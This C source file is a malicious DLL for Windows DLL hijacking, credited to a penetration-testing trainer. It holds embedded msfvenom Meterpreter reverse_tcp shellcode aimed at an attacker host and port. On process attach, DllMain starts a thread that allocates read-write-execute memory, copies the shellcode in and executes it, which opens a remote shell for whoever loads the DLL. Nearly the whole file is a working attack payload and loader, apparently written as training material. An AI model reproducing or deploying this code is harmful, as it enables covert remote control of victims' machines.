//   Dll Hijacking via Thread Creation 
// Author - Vivek Ramachandran 
//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
// Free Infosec Videos --  http://SecurityTube.net 



#include <windows.h>
#define SHELLCODELEN	1024	


// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=9000 -f c 

unsigned char shellcode[SHELLCODELEN] = 
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x09\x22\xe9\x57\xde\x49\xfa\xd2\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf5\x6a\x6a\xb3\x2e\xa1"
"\x3a\xd2\x09\x22\xa8\x06\x9f\x19\xa8\x83\x5f\x6a\xd8\x85\xbb"
"\x01\x71\x80\x69\x6a\x62\x05\xc6\x01\x71\x80\x29\x6a\x62\x25"
"\x8e\x01\xf5\x65\x43\x68\xa4\x66\x17\x01\xcb\x12\xa5\x1e\x88"
"\x2b\xdc\x65\xda\x93\xc8\xeb\xe4\x16\xdf\x88\x18\x3f\x5b\x63"
"\xb8\x1f\x55\x1b\xda\x59\x4b\x1e\xa1\x56\x0e\xc2\x7a\x5a\x09"
"\x22\xe9\x1f\x5b\x89\x8e\xb5\x41\x23\x39\x07\x55\x01\xe2\x96"
"\x82\x62\xc9\x1e\xdf\x99\x19\x84\x41\xdd\x20\x16\x55\x7d\x72"
"\x9a\x08\xf4\xa4\x66\x17\x01\xcb\x12\xa5\x63\x28\x9e\xd3\x08"
"\xfb\x13\x31\xc2\x9c\xa6\x92\x4a\xb6\xf6\x01\x67\xd0\x86\xab"
"\x91\xa2\x96\x82\x62\xcd\x1e\xdf\x99\x9c\x93\x82\x2e\xa1\x13"
"\x55\x09\xe6\x9b\x08\xf2\xa8\xdc\xda\xc1\xb2\xd3\xd9\x63\xb1"
"\x16\x86\x17\xa3\x88\x48\x7a\xa8\x0e\x9f\x13\xb2\x51\xe5\x02"
"\xa8\x05\x21\xa9\xa2\x93\x50\x78\xa1\xdc\xcc\xa0\xad\x2d\xf6"
"\xdd\xb4\x1f\x64\x48\xfa\xd2\x09\x22\xe9\x57\xde\x01\x77\x5f"
"\x08\x23\xe9\x57\x9f\xf3\xcb\x59\x66\xa5\x16\x82\x65\xb9\x4f"
"\x70\x5f\x63\x53\xf1\x4b\xf4\x67\x2d\xdc\x6a\x6a\x93\xf6\x75"
"\xfc\xae\x03\xa2\x12\xb7\xab\x4c\x41\x95\x1a\x50\x86\x3d\xde"
"\x10\xbb\x5b\xd3\xdd\x3c\x34\xbf\x25\x99\xfc\x6c\x5a\x8c\x57"
"\xde\x49\xfa\xd2";

DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{

	LPVOID newMemory;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL didWeCopy = FALSE;

	// Get the current process handle 
	currentProcess = GetCurrentProcess();


	// Allocate memory with Read+Write+Execute permissions 
	newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (newMemory == NULL)
		return -1;

	// Copy the shellcode into the memory we just created 
	didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, SHELLCODELEN, &bytesWritten);

	if (!didWeCopy)
		return -2;

	// Yay! Let's run our shellcode! 
	((void(*)())newMemory)();

	return 1;
}




BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    HANDLE threadHandle;

    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:

		// Create a thread and close the handle as we do not want to use it to wait for it 
		
     	    threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
	    CloseHandle(threadHandle);

            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}


